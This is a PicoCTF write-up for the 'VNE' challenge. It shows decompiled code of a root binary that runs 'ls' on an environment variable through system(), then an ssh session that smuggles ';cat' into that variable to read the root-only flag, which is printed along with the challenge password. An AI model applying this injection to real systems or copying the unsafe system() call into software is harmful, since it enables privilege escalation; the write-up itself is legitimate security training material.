---
title: PicoCTF - VNE
tags: [PicoCTF, PWN, CTF]

category: "Security/Practice/PicoCTF/PWN"
---

# PicoCTF - VNE
## Background
System Environment
Command Injection

## Description & Hint
We've got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named "bin" once connected. Login as ctf-player with the password, d137d16e
* Hint 1: Have you checked the content of the /root folder
* Hint 2: Find a way to add more instructions to the ls

## Source Code
:::spoiler IDA Main Function
```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  int v4; // ebx
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  const char *v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  char v12; // [rsp+3h] [rbp-6Dh] BYREF
  unsigned int v13; // [rsp+4h] [rbp-6Ch]
  char *v14; // [rsp+8h] [rbp-68h]
  char v15[32]; // [rsp+10h] [rbp-60h] BYREF
  char v16[40]; // [rsp+30h] [rbp-40h] BYREF
  unsigned __int64 v17; // [rsp+58h] [rbp-18h]

  v17 = __readfsqword(0x28u);
  v14 = getenv("SECRET_DIR");
  if ( v14 )
  {
    v5 = std::operator<<<std::char_traits<char>>(&std::cout, "Listing the content of ");
    v6 = std::operator<<<std::char_traits<char>>(v5, v14);
    v7 = std::operator<<<std::char_traits<char>>(v6, " as root: ");
    std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
    std::allocator<char>::allocator(&v12);
    std::string::basic_string(v16, v14, &v12);
    std::operator+<char>(v15, "ls ", v16);
    std::string::~string(v16);
    std::allocator<char>::~allocator(&v12);
    setgid(0);
    setuid(0);
    v8 = (const char *)std::string::c_str(v15);
    v13 = system(v8);
    if ( v13 )
    {
      v9 = std::operator<<<std::char_traits<char>>(&std::cerr, "Error: system() call returned non-zero value: ");
      v10 = std::ostream::operator<<(v9, v13);
      std::ostream::operator<<(v10, &std::endl<char,std::char_traits<char>>);
      v4 = 1;
    }
    else
    {
      v4 = 0;
    }
    std::string::~string(v15);
  }
  else
  {
    v3 = std::operator<<<std::char_traits<char>>(&std::cerr, "Error: SECRET_DIR environment variable is not set");
    std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
    return 1;
  }
  return v4;
}
```
:::
## Recon
這一題也是蠻有趣的，題目有說要先執行bin，可以用winscp遠端把執行檔dump到local端，然後用IDA逆一下，就會發現它其實就是執行ls而已，所以我們就要用簡單的command injection達到RCE
## Exploit
```bash
$ ssh ctf-player@saturn.picoctf.net -p 58395
$ ./bin
Error: SECRET_DIR environment variable is not set
$ export SECRET_DIR=/challenge/
$ ./bin
Listing the content of /challenge/ as root:
config-box.py  metadata.json  profile
$ export "SECRET_DIR=/;cat /challenge/metadata.json"
$ ./bin
Listing the content of /;cat /challenge/metadata.json as root:
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
{"flag": "picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}", "password": "d137d16e"}
```

Flag: `picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}`